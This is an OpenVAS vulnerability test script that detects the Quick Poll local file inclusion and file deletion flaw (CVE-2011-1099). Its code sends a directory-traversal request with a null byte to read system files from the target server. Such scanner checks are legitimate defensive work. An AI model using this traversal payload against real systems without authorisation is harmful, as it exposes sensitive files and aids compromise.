###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_quick_polls_46770.nasl 13 2013-10-27 12:16:33Z jan $
#
# Quick Poll Local File Include and Arbitrary File Deletion Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Quick Poll is prone to a local file-include vulnerability and an arbitrary-file-
deletion vulnerability because the application fails to sufficiently
sanitize user-supplied input.

An attacker can exploit a local file-include vulnerability to obtain
potentially sensitive information and execute arbitrary local scripts
in the context of the webserver process. This may allow the attacker
to compromise the application and the computer; other attacks are
also possible.

Attackers can exploit arbitrary-file deletion vulnerability with directory-
traversal strings ('../') to delete arbitrary files; this may aid in
launching further attacks.

Versions prior to Quick Poll 1.0.2 are vulnerable.";

tag_solution = "Vendor patch is available. Please see the reference for details.";

if (description)
{
 script_id(103110);
 script_version("$Revision: 13 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:16:33 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2011-03-08 14:02:18 +0100 (Tue, 08 Mar 2011)");
 script_bugtraq_id(46770);
 script_tag(name:"cvss_base", value:"5.8");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:P/I:N/A:P");
  script_cve_id("CVE-2011-1099");

 script_name("Quick Poll Local File Include and Arbitrary File Deletion Vulnerabilities");

desc = "
 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_xref(name : "URL" , value : "https://www.securityfocus.com/bid/46770");
 script_xref(name : "URL" , value : "http://www.focalmedia.net/create_voting_poll.html");
 script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/516873");
 script_xref(name : "URL" , value : "http://www.uncompiled.com/2011/03/quick-polls-local-file-inclusion-deletion-vulnerabilities-cve-2011-1099/");

 script_tag(name:"risk_factor", value:"High");
 script_description(desc);
 script_summary("Determine if Quick Poll is prone to a local file-include vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2011 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);

if(!can_host_php(port:port))exit(0);

files = traversal_files();

dirs = make_list("/quickpoll",cgi_dirs());

foreach dir (dirs) {
  foreach file (keys(files)) {
   
    url = string(dir, "/index.php?fct=preview&p=",crap(data:"../",length:6*9),files[file],"%00"); 

    if(http_vuln_check(port:port, url:url,pattern:file)) {
     
      security_hole(port:port);
      exit(0);

    }
  }
}
exit(0);

